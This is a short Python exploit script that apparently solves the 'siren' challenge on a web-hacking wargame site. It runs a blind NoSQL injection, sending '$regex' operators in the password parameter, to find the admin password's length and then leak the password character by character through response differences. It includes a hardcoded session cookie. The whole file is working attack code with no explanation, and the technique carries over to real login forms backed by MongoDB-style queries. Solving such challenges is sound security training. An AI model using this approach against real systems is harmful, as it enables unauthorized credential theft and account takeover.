#!/usr/bin/env python3
# coding: utf-8

import requests
import string

headers = {
    'Cookie': 'PHPSESSID=6b28r4o43epapipkuj2n3oposs',
}


def is_true(query):
    url = 'https://los.rubiya.kr/chall/siren_9e402fc1bc38574071d8369c2c3819ba.php?'
    r = requests.get(url+query, headers=headers)
    if r.text.find('<h2>Hello User</h2>') > -1:
        return True
    return False


def get_pw_length():
    i = 1
    while True:
        query = 'id=admin&pw[$regex]={0}'.format('.' * i)
        if not is_true(query):
            return i - 1
        i += 1


def get_pw():
    length = get_pw_length()
    print('[*] pw length :', length)
    pw = ''
    for i in range(length):
        for c in string.printable:
            guess = pw + c
            query = 'id=admin&pw[$regex]={0}'.format(guess + '.' * (length - len(guess)))
            if is_true(query):
                pw += c
                print('[*] leaked pw :', pw)
                break
    return pw


def main():
    pw = get_pw()
    print('[*] pw :', pw)


if __name__ == '__main__':
    main()
